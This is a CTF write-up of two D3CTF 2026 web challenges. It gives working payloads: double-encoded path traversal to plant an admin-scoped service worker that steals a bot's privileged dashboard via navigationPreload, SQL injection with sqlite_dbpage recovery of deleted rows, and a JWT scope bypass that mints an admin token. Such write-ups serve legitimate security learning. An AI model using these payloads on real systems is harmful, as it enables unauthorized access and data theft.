---
title: "D3CTF 2026 Web Writeup: Scope Drift + Ghost Zero"
slug: "d3ctf-2026-web-writeup"
description: "D3CTF 2026 web step-by-step: Scope Drift service-worker scope confusion via double-encoded path traversal planting an admin-scoped SW and reading the private dashboard via navigationPreload; Ghost Zero AES-GCM encrypted gateway hidden legacy operation JWT ticket scope-bypass granting an admin token."
date: 2026-07-31T16:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["D3CTF 2026"]
tags:
  - "d3ctf"
  - "d3ctf 2026"
  - "ctf writeup"
  - "web"
  - "web exploitation"
  - "service worker"
  - "scope confusion"
  - "path traversal"
  - "double url encoding"
  - "navigation preload"
  - "aes-gcm"
  - "encrypted gateway"
  - "ecdh"
  - "hkdf"
  - "jwt"
  - "privilege escalation"
  - "sql injection"
  - "sqlite"
  - "hidden endpoint"
  - "pcap analysis"
  - "sqlite dbpage"
keywords:
  - "d3ctf 2026 web writeup"
  - "scope drift d3ctf writeup"
  - "ghost zero d3ctf writeup"
  - "service worker scope confusion ctf"
  - "double url encoding path traversal bypass"
  - "navigation preload service worker intercept privileged response"
  - "aes gcm encrypted gateway ctf 2026"
  - "ecdh hkdf key derivation web ctf"
  - "sqlite sqli hidden table recovery ctf"
  - "jwt ticket scope bypass privilege escalation"
  - "hidden gateway operation ctf web"
  - "sqlite dbpage deleted row recovery"
  - "service worker navigationPreload 403 bypass"
  - "path normalization mismatch double decode web ctf"
  - "pcap legacy api endpoint discovery ctf"
toc: true
cover:
  image: "/images/articles/d3ctf-2026-web-writeup.png"
  alt: "D3CTF 2026 web writeup — two challenges solved covering Scope Drift a static hosting platform where double-encoded path traversal drifts a guest-uploaded file into the admin namespace allowing a service worker to be planted at /u/admin/sw.js registered from a same-origin guest page and used to intercept the reviewer bot's navigation to the private admin dashboard reading the privileged response via navigationPreload rather than a 403-returning worker-initiated replay; and Ghost Zero an archive search application with an AES-GCM encrypted transport layer concealing a hidden legacy gateway operation /ddddddtestStat that returns a server-signed JWT ticket whose scope claim is not validated by the exchange endpoint so a session-scoped guest ticket mints an admin access token that unlocks /api/flag"
---

D3CTF 2026's web track — two technically deep challenges that share a common design failure: **the security boundary was enforced at the wrong layer of the stack**. **Scope Drift** (632 pts, 78 solves) was a static hosting platform that isolated guest and admin namespaces by URL prefix — guest files under `/u/guest/`, admin files under `/u/admin/`. The upload validator decoded the submitted path once, confirmed it was guest-owned, and accepted the upload. The static file server decoded and normalized the path a second time. A double-percent-encoded traversal segment (`%252e%252e`) decoded to `%2e%2e` after the validator and to `..` after the file server, landing the uploaded file in the admin namespace despite passing the guest check. That one character of encoding difference was enough to plant a JavaScript service worker at `/u/admin/sw.js`, register it from a same-origin guest page submitted for admin review, and intercept the reviewer bot's subsequent navigation to `/u/admin/dashboard`. A naive service-worker replay of the navigation returned `403 Forbidden` — the intercepted request lacked the bot's privileged session context. Enabling `navigationPreload` changed the outcome: the browser performed the real privileged navigation in parallel with waking up the worker, and the service worker read that response from `event.preloadResponse`, extracting the flag from the dashboard HTML. **Ghost Zero** (909 pts, 36 solves) was an archive search application whose client-to-server channel was encrypted with AES-GCM keys derived from an ECDH handshake, preventing casual inspection of the gateway protocol. Underneath the search UI was a SQL injection that exposed a hidden database table containing pcap download paths. A deleted row recovered from `sqlite_dbpage` held a pcap of legacy internal traffic to `/ddddddtestStat` — a route that returned `404` as a normal HTTP call but was accepted by the encrypted gateway dispatcher. Calling it through the gateway returned a server-signed `typ:"ticket"` JWT. The `/api/auth/exchange` endpoint validated the signature and the `typ` claim but did not check the `scope` claim — a `scope:"session"` guest ticket was treated identically to a privileged bootstrap ticket, yielding an admin access token that unlocked `/api/flag` directly.

Handouts, per-challenge READMEs, and solver scripts live at [Abdelkad3r/D3CTF-2026](https://github.com/Abdelkad3r/D3CTF-2026).

## The two D3CTF 2026 web challenges

| Challenge | Points | Solves | Bug class / primitive | Flag |
|---|---|---|---|---|
| Scope Drift | 632 | 78 | Static file hosting with URL-prefix namespace isolation between guest (`/u/guest/`) and admin (`/u/admin/`). Upload validator decodes the submitted path once and checks the guest prefix; static file server decodes and normalizes on serve. Double-encoded traversal `%252e%252e` passes the validator as a guest path and resolves to `..` at serve time. Upload `/u/guest/%252e%252e/admin/sw.js` → served at `/u/admin/sw.js` with `Service-Worker-Allowed: /u/admin/` and `Content-Type: application/javascript`. Register this worker from a same-origin guest page submitted for bot review. Bot installs the worker, then navigates to `/u/admin/dashboard`. Plain `fetch(event.request)` replay: `403`. Enable `navigationPreload`, read `event.preloadResponse`: real dashboard with flag. | `d3ctf{sERVICe-w0RK3R_SCOp3_CoNFUSi0N18c3180}` |
| Ghost Zero | 909 | 36 | Archive search with AES-GCM encrypted gateway (ECDH P-256 + HKDF-SHA-256 key derivation, canonical JSON AAD). SQL injection in `search` reveals hidden table `q_8f3c1a72d90e4b65` containing pcap paths. Deleted row recovered from `sqlite_dbpage` holds a pcap of legacy internal traffic to `/ddddddtestStat`. Route returns `404` as a plain HTTP call but is accepted by the encrypted gateway dispatcher. Gateway responds with a server-signed `typ:"ticket"` JWT (`scope:"session"`). `/api/auth/exchange` checks signature + `typ` but not `scope` → mints admin access token (`role:"admin"`). Admin token → `/api/flag`. | `d3ctf{5E4rchfor_h1DdEn-Z3r0-GhO5t-iNt3rfAC3-cRaCK1tr1GhtYeah0}` |

Both challenges share a structural failure worth naming before the walkthroughs: **the enforcement point was separated from the decision point**. In Scope Drift, the security decision (is this path guest-owned?) was made at upload time, but the path's meaning was determined at serve time — two different decodings of the same bytes. In Ghost Zero, the security decision (is this ticket privileged enough to mint an admin token?) was partially delegated to a claim inside the ticket itself — `scope` — and the exchange endpoint did not validate that claim. In both cases the attacker found the gap between where the server made its security decision and where it acted on the result.

## Methodology — find where the enforcement and decision points diverge

The common attack pattern for both challenges: **identify where the server makes a security decision, then look for any path that diverges between the decision point and the enforcement point**.

For Scope Drift the audit checklist is: (1) what path does the upload validator check, (2) what path does the static server compute at serve time, (3) are they derived from the same bytes by the same decoding logic? If the answer to (3) is no, there is a decode-order gap. The practical test is to send a path that decodes to different strings depending on how many rounds of percent-decoding are applied. `%252e%252e` decodes to `%2e%2e` on the first pass and `..` on the second. Submit it and check whether the uploaded file appears under the intended namespace or escapes it.

For Ghost Zero the audit checklist is: (1) what transport does the client use, (2) what operations does the gateway expose beyond what the UI shows, (3) what claims does the token exchange endpoint check? The encrypted transport makes passive inspection harder but not impossible — the JavaScript source is always available to the client. Reading the worker source reveals the full key derivation and encryption scheme, making it possible to implement a gateway client and enumerate targets manually. Once an unknown operation returns a ticket, the question is whether every claim in that ticket is verified before trust is granted.

The correlate for defenders: **apply the narrowest possible decoding at each layer, then pass canonical paths — not raw inputs — to downstream security checks**. For JWT exchange endpoints: **validate every claim that the minting logic intended to restrict, not only the claims you happen to check in the happy path**. Incomplete claim validation is a privilege escalation by omission.

Per-challenge walkthroughs follow.

## 1. Scope Drift

632 points, 78 solves. Static hosting platform. Guest and admin files isolated by URL prefix. Double-encoded path traversal bypasses the upload validator. A JavaScript file lands in the admin namespace and is served with `Service-Worker-Allowed: /u/admin/`. A same-origin guest page registers this as an admin-scoped service worker. The reviewer bot installs the worker and then navigates to the private admin dashboard. Enabling `navigationPreload` in the worker captures the real privileged dashboard response and exfiltrates it to the webhook inbox.

### Step 1 — Map the application surface

```bash
curl -i https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/
```

The homepage described the full workflow:

```text
/upload              Upload a file
/files               My uploaded files
/bot                 Submit a URL for admin review
/inbox               Webhook inbox for callbacks
/u/admin/dashboard   Admin private dashboard (403 for guests)
```

The upload form stated the namespace rule:

```text
Guest files must be placed under /u/guest/
```

The review form accepted a URL and noted that the admin reviewer would open the page, wait briefly, and then navigate to the private admin dashboard. Direct access to the dashboard was blocked:

```bash
curl -i https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/u/admin/dashboard
```

```text
HTTP/1.1 403 Forbidden

forbidden
```

The attack surface was clear: the guest could upload arbitrary files under their namespace, submit a URL for the bot to visit, and receive callbacks in the webhook inbox. The flag was behind a `403` on the admin dashboard. The question was whether the namespace isolation between `/u/guest/` and `/u/admin/` was sound.

### Step 2 — Probe the upload namespace restriction

Test a plain traversal attempt:

```bash
curl -sS -X POST \
  https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/upload \
  --data-urlencode 'path=/u/guest/../admin/probe.txt' \
  --data-urlencode 'content=hello'
```

```json
{"error":"path outside guest namespace"}
```

Test single-encoded traversal:

```bash
curl -sS -X POST \
  https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/upload \
  --data-urlencode 'path=/u/guest/%2e%2e/admin/probe.txt' \
  --data-urlencode 'content=hello'
```

```json
{"error":"path outside guest namespace"}
```

Both were rejected. The validator decoded at least one round of percent-encoding and caught the traversal. The key question: did it decode only once?

### Step 3 — Discover the double-encoding bypass

A percent sign itself percent-encodes as `%25`. A double-encoded dot is therefore `%252e`: after one decode pass it becomes `%2e` (still a percent-encoded dot); after a second decode pass it becomes the literal `.`. Test it:

```bash
curl -sS -X POST \
  https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/upload \
  --data-urlencode 'path=/u/guest/%252e%252e/admin/probe.txt' \
  --data-urlencode 'content=namespace-test'
```

```json
{"ok":true,"path":"/u/guest/%2e%2e/admin/probe.txt","url":"/u/guest/%2e%2e/admin/probe.txt"}
```

The upload succeeded. The validator decoded once, saw `/u/guest/%2e%2e/admin/probe.txt` — a path that still begins with `/u/guest/` — and accepted it. The response body confirmed that the stored path still contained the literal string `%2e%2e`, not `..`.

Now check whether the static file server decodes a second time:

```bash
curl -i https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/u/admin/probe.txt
```

```text
HTTP/1.1 200 OK
Content-Type: text/plain

namespace-test
```

The file was reachable at `/u/admin/probe.txt`. The decode-order gap was confirmed:

1. Upload validator decoded `%252e%252e` → `%2e%2e`. Path appeared as `/u/guest/%2e%2e/admin/probe.txt`. Check passed — still looks guest-owned.
2. Static file server decoded `%2e%2e` → `..`. Path normalized to `/u/admin/probe.txt`. File served from the admin namespace.

### Step 4 — Plant the admin-namespaced service worker

The namespace drift allowed writing any file into `/u/admin/`. The critical question: would the server serve a JavaScript file from that path with the headers needed for service-worker registration?

```bash
curl -sS -X POST \
  https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/upload \
  --data-urlencode 'path=/u/guest/%252e%252e/admin/sw.js' \
  --data-urlencode 'content=// probe'
```

```json
{"ok":true,"path":"/u/guest/%2e%2e/admin/sw.js"}
```

Check the response headers of the served file:

```bash
curl -I https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/u/admin/sw.js
```

```text
HTTP/1.1 200 OK
Content-Type: application/javascript
Service-Worker-Allowed: /u/admin/
```

Two critical headers were present:

- **`Content-Type: application/javascript`** — the browser requires this MIME type to register a script as a service worker. A wrong MIME type (e.g., `text/plain`) causes the registration to be rejected with a security error.
- **`Service-Worker-Allowed: /u/admin/`** — browsers normally restrict a service worker's scope to the directory containing the script file. This header extends the allowed scope to `/u/admin/`, permitting registration with `{ scope: '/u/admin/' }`.

A service worker registered at `/u/admin/sw.js` with scope `/u/admin/` would intercept all fetch events for URLs beginning with `/u/admin/` — including `/u/admin/dashboard`. The setup was complete on paper; the remaining question was execution.

### Step 5 — Understand why a plain replay returns 403

Before building the final worker, consider the naive approach: intercept the navigation and replay it with `fetch(event.request)`.

```javascript
// First attempt — this does NOT work
self.addEventListener('fetch', e => {
  if (new URL(e.request.url).pathname.startsWith('/u/admin/')) {
    e.respondWith(fetch(e.request));
  }
});
```

After submitting a test version and triggering the bot, the webhook inbox showed the worker installed and intercepted the navigation — but the response body was:

```text
status=403
url=http://localhost:3000/u/admin/dashboard
forbidden
```

Two observations. First, the bot used the internal origin `http://localhost:3000`, not the public challenge hostname — confirming the reviewer ran a local browser with privileged internal routing. Second, the replayed fetch returned `403` even though the real browser navigation would return `200`.

The root cause: `fetch(event.request)` from inside a service worker is a **worker-initiated fetch**. It originates from the service worker's execution context, not from the browser's navigation machinery. The server at `localhost:3000` distinguished between the two — the real navigation carried credentials and routing flags that the worker replay did not. `403` for the replay; `200` for the genuine navigation.

### Step 6 — Enable navigationPreload to capture the real response

The [Navigation Preload API](https://developer.chrome.com/docs/workbox/navigation-preload/) was designed to reduce the latency penalty of service workers on navigation requests: when enabled during the worker's `activate` event, the browser sends the navigation request to the server immediately — in parallel with waking up the service worker — and stores the response as `event.preloadResponse`. This response is the result of the **browser's own navigation fetch**, originating from the browser's network stack under the same session context as any other navigation the bot performs. Because it is the browser's real navigation, not a worker-initiated replay, the server returns the actual `200 OK` dashboard to it. The service worker reads this real response and exfiltrates it.

The complete working service worker:

```javascript
self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));

self.addEventListener('activate', e => e.waitUntil((async () => {
  // Enable preload so the browser performs the real navigation in parallel
  if (self.registration.navigationPreload) {
    await self.registration.navigationPreload.enable();
  }
  await self.clients.claim();
})()));

self.addEventListener('fetch', e => {
  const u = new URL(e.request.url);
  if (u.pathname.startsWith('/u/admin/')) {
    e.respondWith((async () => {
      // Read the browser's own privileged navigation response
      let r = await e.preloadResponse;
      if (!r) r = await fetch(e.request);   // fallback if preload unavailable
      const text = await r.clone().text();
      // Exfiltrate to the guest webhook inbox (same origin — no CORS issue)
      await fetch('/webhook/guest', {
        method: 'POST',
        headers: {'Content-Type': 'text/plain'},
        body: text
      });
      return r;
    })());
  }
});
```

Walking through the key decisions:

- **`self.skipWaiting()` on install** — forces the new worker to activate immediately without waiting for the existing worker (if any) to release its clients. Required so the worker is active before the bot navigates to the dashboard.
- **`self.clients.claim()` on activate** — makes the newly-activated worker the controlling worker for all clients in scope without requiring a page reload. The bot's tab becomes controlled immediately.
- **`e.preloadResponse` before `fetch(e.request)`** — reads the real browser navigation first; falls back to a worker-initiated fetch only if preload is unavailable. In this challenge the preload always resolved.
- **`r.clone().text()`** — the `Response` body can only be consumed once. Cloning before reading allows both exfiltration and passing the response back to the page.
- **`fetch('/webhook/guest', ...)`** — posting to `/webhook/guest` is same-origin, so no CORS restrictions apply. The bot's cookies for this origin are sent automatically.

### Step 7 — Upload the worker and registration page, trigger the bot

Upload the final service worker via the double-encoding bypass:

```bash
curl -sS -X POST \
  https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/upload \
  --data-urlencode 'path=/u/guest/%252e%252e/admin/sw.js' \
  --data-urlencode "content=$(cat sw.js)"
```

Upload the guest registration page:

```bash
curl -sS -X POST \
  https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/upload \
  --data-urlencode 'path=/u/guest/scope-drift.html' \
  --data-urlencode 'content=<!doctype html><meta charset="utf-8"><script>
(async () => {
  const reg = await navigator.serviceWorker.register("/u/admin/sw.js", {scope: "/u/admin/"});
  await new Promise(r => setTimeout(r, 1200));
  await fetch("/webhook/guest", {
    method: "POST",
    headers: {"Content-Type": "text/plain"},
    body: "SW registered: " + reg.scope + " active=" + !!reg.active
  });
})().catch(e => fetch("/webhook/guest", {
  method: "POST",
  headers: {"Content-Type": "text/plain"},
  body: "REGERR: " + (e && e.stack ? e.stack : e)
}));
</script><h1>review</h1>'
```

Submit the guest page for bot review:

```bash
curl -sS \
  "https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/bot?url=http://localhost:3000/u/guest/scope-drift.html"
```

```text
HTTP 200 admin bot finished
```

Poll the webhook inbox:

```bash
curl -sS https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf/inbox
```

The inbox contained the captured dashboard HTML:

```html
<html>
  ...
  <p>Private deployment note:
    <code>d3ctf{sERVICe-w0RK3R_SCOp3_CoNFUSi0N18c3180}</code>
  </p>
  ...
</html>
```

Full automated run:

```bash
python3 exploit.py https://rble3rzotderdak22ubgz2rckma.cloud.d3c.tf
```

```text
[+] bot: HTTP 200 admin bot finished
d3ctf{sERVICe-w0RK3R_SCOp3_CoNFUSi0N18c3180}
```

Per-challenge README + solver: [web/scope-drift](https://github.com/Abdelkad3r/D3CTF-2026/tree/master/web/scope-drift).

Three portable lessons. **Path security checks must operate on fully-canonicalized paths.** The upload validator decoded once, which was not enough — the static file server decoded again. The canonical rule: decode and normalize exactly once at the point where raw input enters the system, apply all security checks to the canonical form, and pass that same canonical form to every downstream handler. Never check partially-decoded bytes. **Service-worker scope is a security boundary only when guest and admin content are on separate origins.** When a hosting platform serves multiple tenants on the same origin (same scheme + host + port), a service worker registered by one tenant with the appropriate scope can intercept another tenant's navigations. Path-prefix isolation is not a security boundary for service workers — only origin isolation is. Serving guest and admin content on distinct origins (e.g., `guest.static.example.com` vs `admin.static.example.com`) would have made cross-tenant service-worker registration impossible. **`event.preloadResponse` exposes the browser's real navigation to the worker.** A service-worker `fetch(event.request)` replay is a worker-initiated request, not a navigation — the server can distinguish between them and may deny the replay. `event.preloadResponse` is the response to the browser's own navigation and cannot be spoofed or replayed by the worker; it is simply read. Any architecture that relies on the server refusing worker-initiated replays to protect privileged endpoints is broken by design once a service worker is installed in the privileged scope.

## 2. Ghost Zero

909 points, 36 solves. Archive search application. AES-GCM encrypted transport over ECDH + HKDF key derivation. SQL injection in `search` reveals a hidden database table. Deleted row recovered from `sqlite_dbpage` holds a pcap of legacy internal traffic naming a hidden gateway operation. That operation returns a server-signed JWT ticket. The exchange endpoint validates the signature and `typ` claim but not `scope` — a session-scoped ticket mints an admin token. Admin token unlocks the flag endpoint.

### Step 1 — Understand the encrypted transport layer

The homepage loaded two JavaScript assets:

```text
/assets/index-cTcmaRYN.js
/assets/crypto.worker-DW2VSort.js
```

The crypto worker contained the complete transport protocol. Reading it revealed a four-step bootstrap:

**Step A — Request a guest session token:**

```bash
curl -sS -X POST https://rhyadyl45ygwepkosojqagqlyge.cloud.d3c.tf/api/session/guest \
  -H 'Accept: application/json'
```

```json
{"token":"eyJ..."}
```

**Step B — ECDH key exchange with the server:**

```bash
curl -sS -X POST https://rhyadyl45ygwepkosojqagqlyge.cloud.d3c.tf/api/transport/bootstrap \
  -H 'Authorization: Bearer <guest-token>' \
  -H 'Content-Type: application/json' \
  -d '{"clientPublicKey": <P-256 JWK public key>}'
```

```json
{
  "sid": "sess-abc123...",
  "serverPublicKey": { "crv": "P-256", "kty": "EC", ... },
  "salt": "<base64url-encoded 32-byte random salt>"
}
```

**Step C — Key derivation via HKDF-SHA-256:**

Both sides derived two 256-bit AES-GCM keys from the shared ECDH secret:

```text
HKDF(sharedSecret, salt, info="ghost-packet:c2s") → clientEncryptKey   (for encrypting c2s packets)
HKDF(sharedSecret, salt, info="ghost-packet:s2c") → serverEncryptKey   (for decrypting s2c responses)
```

**Step D — Encrypted packet format sent to `POST /api/gateway`:**

```json
{
  "v": 1,
  "sid": "<session ID from bootstrap>",
  "seq": <incrementing integer starting at 1>,
  "ts": <current unix milliseconds>,
  "iv": "<base64url 12-byte random nonce>",
  "ct": "<base64url AES-GCM ciphertext + 128-bit authentication tag>"
}
```

The AES-GCM plaintext was canonical JSON of `{"body":{...},"target":"..."}`. The additional authenticated data (AAD) was canonical JSON of `{"direction":"c2s","seq":N,"sid":"...","ts":T,"v":1}` — keys sorted alphabetically, no whitespace. The worker source defined canonical JSON explicitly: sort object keys, recurse, no spaces. Any deviation in key order caused the server's AAD check to fail with an authentication error.

### Step 2 — Implement the encrypted gateway client

With the protocol fully specified in the worker source, implementing a standalone client in Node.js was mechanical. The complete client is at [web/ghost-zero/exploit.mjs](https://github.com/Abdelkad3r/D3CTF-2026/tree/master/web/ghost-zero).

The four correctness requirements:

1. **Canonical JSON for both plaintext and AAD.** Keys must be sorted alphabetically; whitespace must be absent. `Object.keys(value).sort().map(k => ...)` with no space argument in `JSON.stringify`.
2. **Base64url without padding.** The worker used URL-safe base64 with no `=` padding. Node.js `Buffer.from(buf).toString('base64url')` handles both requirements.
3. **Strictly incrementing sequence numbers.** The server rejected out-of-order or replayed sequence numbers with an authentication error.
4. **Matching AAD direction on decrypt.** The `direction` field flips — `"c2s"` for outbound packets, `"s2c"` for inbound responses. Using the wrong direction value produces a GCM authentication tag mismatch and decryption failure.

Test with the known `search` operation:

```javascript
const result = await gateway(state, "search", { q: "test" });
// → {"ok":true,"data":{"results":[...]}}
```

Gateway client confirmed working.

### Step 3 — Discover the SQL injection in the search operation

The `search` target's `q` parameter was interpolated into a SQLite `LIKE` query without parameterization. Testing a UNION injection to read the schema:

```javascript
const sqli = await gateway(state, "search", {
  q: "x' UNION SELECT 999,name,sql FROM sqlite_master--"
});
console.log(sqli.data.results);
```

```json
[
  {
    "id": 999,
    "title": "knowledge_base",
    "summary": "CREATE TABLE knowledge_base (id INTEGER PRIMARY KEY, title TEXT NOT NULL, summary TEXT NOT NULL)"
  },
  {
    "id": 999,
    "title": "q_8f3c1a72d90e4b65",
    "summary": "CREATE TABLE \"q_8f3c1a72d90e4b65\" (id INTEGER PRIMARY KEY, \"r4\" TEXT NOT NULL)"
  }
]
```

Two tables. `knowledge_base` was the visible search corpus. `q_8f3c1a72d90e4b65` was a hidden table with a single text column `r4`, not referenced anywhere in the UI.

Query the hidden table directly:

```javascript
const hidden = await gateway(state, "search", {
  q: "x' UNION SELECT id,r4,r4 FROM \"q_8f3c1a72d90e4b65\"--"
});
// → {"ok":true,"data":{"results":[]}}
```

The table existed but was empty — all rows had been deleted. The content had to be recovered from raw page data.

### Step 4 — Recover the deleted pcap path from sqlite_dbpage

SQLite stores table rows as B-tree records in fixed-size pages. When a row is deleted, SQLite marks its slot as free but does not immediately zero the bytes on disk. The `sqlite_dbpage` virtual table exposes the raw bytes of every page in the database. By reading the page that held the deleted row, an attacker can extract its content by scanning for record structures or printable strings.

Find the root page number for the hidden table:

```javascript
const rootInfo = await gateway(state, "search", {
  q: "x' UNION SELECT 999,CAST(rootpage AS TEXT),CAST(rootpage AS TEXT) FROM sqlite_master WHERE name='q_8f3c1a72d90e4b65'--"
});
const pageNum = rootInfo.data.results[0]?.title;
```

Read the raw page bytes as hex:

```javascript
const pageData = await gateway(state, "search", {
  q: `x' UNION SELECT 999,hex(data),hex(data) FROM sqlite_dbpage WHERE pgno=${pageNum}--`
});
const hexData = pageData.data.results[0]?.title;
```

Convert to a buffer and scan for ASCII strings:

```javascript
const buf = Buffer.from(hexData, 'hex');
let current = '';
const strings = [];
for (const byte of buf) {
  if (byte >= 0x20 && byte < 0x7f) {
    current += String.fromCharCode(byte);
  } else {
    if (current.length > 8) strings.push(current);
    current = '';
  }
}
console.log(strings);
```

The recovered strings included a file path:

```text
/captures/legacy-session-2025-12-07.pcap
```

Download and inspect the pcap:

```bash
curl -sS -o legacy.pcap \
  https://rhyadyl45ygwepkosojqagqlyge.cloud.d3c.tf/captures/legacy-session-2025-12-07.pcap

tshark -r legacy.pcap -Y http -T fields \
  -e http.request.method \
  -e http.request.uri \
  -e http.file_data 2>/dev/null | head -40
```

The pcap showed a legacy HTTP session to an internal host:

```http
POST /ddddddtestStat HTTP/1.1
Host: legacy-api.internal:8080
X-Legacy-Mode: plaintext-test
X-Debug-Capture: pre-encryption

{"principal":"ops-root","mode":"bootstrap","credentialType":"temporary"}
```

Response body in the pcap:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "exchangeTicket": "eyJ...PLACEHOLDER...signature",
  "scope": "session",
  "grantType": "legacy-bootstrap",
  "expiresIn": 180
}
```

The `exchangeTicket` in the pcap used a placeholder signature — replaying it to `/api/auth/exchange` would fail signature verification. The useful discovery was the **route name**: `/ddddddtestStat`.

### Step 5 — Call the hidden gateway operation

The public HTTP route returned `404`:

```bash
curl -i https://rhyadyl45ygwepkosojqagqlyge.cloud.d3c.tf/ddddddtestStat
```

```text
HTTP/1.1 404 Not Found
```

But the encrypted gateway dispatcher accepted it as a target when the leading slash was included:

```javascript
const legacy = await gateway(state, "/ddddddtestStat", {});
console.log(JSON.stringify(legacy, null, 2));
```

```json
{
  "ok": true,
  "data": {
    "exchangeTicket": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOiJ0aWNrZXQiLCJzY29wZSI6InNlc3Npb24iLCJzdWIiOiJndWVzdC1hMmI4YyIsImlzcyI6Imdob3N0LXBhY2tldC1hdXRoIiwiYXVkIjoiZ2hvc3QtcGFja2V0LXRpY2tldCIsImlhdCI6MTc4NTAyMDA3NywiZXhwIjoxNzg1MDIwMjU3fQ.<VALID_ES256_SIGNATURE>",
    "scope": "session",
    "grantType": "legacy-bootstrap",
    "expiresIn": 180
  }
}
```

Decode the ticket header and payload (first two segments):

```bash
python3 - <<'PY'
import base64, json
tok = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOiJ0aWNrZXQiLCJzY29wZSI6InNlc3Npb24iLCJzdWIiOiJndWVzdC1hMmI4YyIsImlzcyI6Imdob3N0LXBhY2tldC1hdXRoIiwiYXVkIjoiZ2hvc3QtcGFja2V0LXRpY2tldCIsImlhdCI6MTc4NTAyMDA3NywiZXhwIjoxNzg1MDIwMjU3fQ.VALID"
for part in tok.split(".")[:2]:
    part += "=" * (-len(part) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(part)), indent=2))
PY
```

```json
{"alg": "ES256", "typ": "JWT"}
{
  "typ": "ticket",
  "scope": "session",
  "sub": "guest-a2b8c",
  "iss": "ghost-packet-auth",
  "aud": "ghost-packet-ticket",
  "iat": 1785020077,
  "exp": 1785020257
}
```

The ticket was a real ES256-signed JWT from the server. Its `scope` was `"session"` — not a privileged claim. The `typ` was `"ticket"` — exactly what the exchange endpoint expected. The hypothesis: the exchange endpoint checked `typ` and `aud` but not `scope`. A session-scoped ticket would be accepted as equivalent to a privileged bootstrap ticket.

### Step 6 — Exchange the session ticket for an admin token

Send the ticket to `/api/auth/exchange`:

```bash
curl -sS -X POST \
  https://rhyadyl45ygwepkosojqagqlyge.cloud.d3c.tf/api/auth/exchange \
  -H 'Content-Type: application/json' \
  -d "{\"ticket\": \"$TICKET\"}"
```

```json
{
  "token": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOiJhY2Nlc3MiLCJyb2xlIjoiYWRtaW4iLCJzdWIiOiJvcHMtcm9vdCIsImlzcyI6Imdob3N0LXBhY2tldC1hdXRoIiwiYXVkIjoiZ2hvc3QtcGFja2V0LWFwaSIsImlhdCI6MTc4NTAyMDA5OCwiZXhwIjoxNzg1MDIzNjk4fQ.<ADMIN_SIGNATURE>"
}
```

Decode the access token payload:

```json
{
  "typ": "access",
  "role": "admin",
  "sub": "ops-root",
  "iss": "ghost-packet-auth",
  "aud": "ghost-packet-api"
}
```

The exchange endpoint accepted the session-scoped ticket, verified the ES256 signature and `typ:"ticket"` claim, and issued a full admin access token with `role:"admin"` and `sub:"ops-root"`. The `scope` claim was never checked.

### Step 7 — Read the flag

```bash
curl -sS \
  https://rhyadyl45ygwepkosojqagqlyge.cloud.d3c.tf/api/flag \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

```json
{"flag":"d3ctf{5E4rchfor_h1DdEn-Z3r0-GhO5t-iNt3rfAC3-cRaCK1tr1GhtYeah0}"}
```

Full automated run:

```bash
node exploit.mjs https://rhyadyl45ygwepkosojqagqlyge.cloud.d3c.tf
```

```text
d3ctf{5E4rchfor_h1DdEn-Z3r0-GhO5t-iNt3rfAC3-cRaCK1tr1GhtYeah0}
```

Per-challenge README + solver: [web/ghost-zero](https://github.com/Abdelkad3r/D3CTF-2026/tree/master/web/ghost-zero).

Three portable lessons. **Encrypted transport hides the channel, not the protocol.** The browser has the JavaScript source. Reading the worker revealed the complete key derivation scheme, packet format, canonical JSON requirements, and every gateway target the dispatcher handled. An attacker who reads the client code can enumerate all registered operations, including targets the UI never exposes. The encryption provided confidentiality against passive sniffing; it provided no protection against an attacker who is the client. **SQL injection in an encrypted channel is still SQL injection.** AES-GCM protects the wire but not the database. Parameterized queries are required at the database layer regardless of what transport wraps them. SQLite's `sqlite_dbpage` is a well-known technique for recovering deleted row data — applications that store sensitive references in a table and later delete them should verify the data is truly gone (e.g., `VACUUM` rewrites all pages, destroying free-space content; alternatively, never store the sensitive path in the database in the first place). **JWT exchange endpoints must validate every claim that restricts privilege.** The intended design had two classes of ticket: session-scoped and admin-bootstrap-scoped. The exchange endpoint checked `typ:"ticket"` and `aud` but not `scope`. As a result, any validly-signed ticket — regardless of the scope the issuer intended — could be exchanged for an admin token. The fix is one conditional: reject any ticket whose `scope` is not `"admin-bootstrap"`. Missing claim validation is a privilege escalation by omission, and it is invisible to signature-level testing because the signature is valid.

## Cross-cutting attacker + defender notes

Four patterns from the D3CTF 2026 web track that translate directly into code-review or triage heuristics.

**Security checks applied to raw inputs that are later canonicalized are bypassable.** Both challenges exploited a version of the same gap. Scope Drift's upload validator and static file server applied different numbers of URL-decode passes to the same bytes; the security check ran after the first pass, the attacker's path meaning was determined after the second. Ghost Zero's exchange endpoint applied full signature validation but incomplete claim validation — the attacker's ticket was validly signed, so it passed every check that was present. Code reviewers should ask two questions at every security check: "what is the exact representation of the input being checked?" and "does any subsequent transformation change the input's security-relevant meaning before it is acted upon?" If yes, the check belongs after the final transformation.

